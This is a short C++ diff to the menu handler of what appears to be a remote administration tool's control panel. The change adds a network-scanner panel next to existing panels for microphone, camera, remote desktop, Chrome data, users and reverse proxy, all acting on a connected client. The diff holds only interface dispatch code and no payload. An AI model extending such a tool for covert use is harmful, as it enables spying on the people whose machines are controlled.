@@ -11,6 +11,7 @@
 #include "panel_info_chrome.hpp"
 #include "panel_usuarios.hpp"
 #include "panel_reverse_proxy.hpp"
+#include "panel_escaner.hpp"
 #include "server.hpp"
 #include "misc.hpp"
 
@@ -167,7 +168,7 @@ void MyTreeCtrl::OnItemActivated(wxTreeEvent& event) {
             this->p_Notebook->AddPage(new panelMicrophone(this,this->sckCliente), wStr, true);
         } else if (wStr == "Camara") {
             this->p_Notebook->AddPage(new panelCamara(this, this->sckCliente), wStr, true);
-        }else if (wStr == "Escritorio Remoto") {
+        } else if (wStr == "Escritorio Remoto") {
             frameRemoteDesktop* frm_temp = DBG_NEW frameRemoteDesktop(this, this->sckCliente);
             frm_temp->Show(true);
         } else if (wStr == "Transferencias") {
@@ -176,10 +177,12 @@ void MyTreeCtrl::OnItemActivated(wxTreeEvent& event) {
             this->p_Notebook->AddPage(new panelWManager(this, this->sckCliente), wStr, true);
         } else if (wStr == "Chrome") {
             this->p_Notebook->AddPage(new panelInfoChrome(this, this->sckCliente), wStr, true);
-        }else if (wStr == "Usuarios") {
+        } else if (wStr == "Usuarios") {
             this->p_Notebook->AddPage(new panelUsuarios(this, this->sckCliente), wStr, true);
-        }else if (wStr == "Proxy Inversa") {
+        } else if (wStr == "Proxy Inversa") {
             this->p_Notebook->AddPage(new panelReverseProxy(this, this->sckCliente), wStr, true);
+        }else if (wStr == "Escaner de Red") {
+            this->p_Notebook->AddPage(new panelEscaner(this, this->sckCliente), wStr, true);
         }
 
         this->p_Notebook->Thaw();
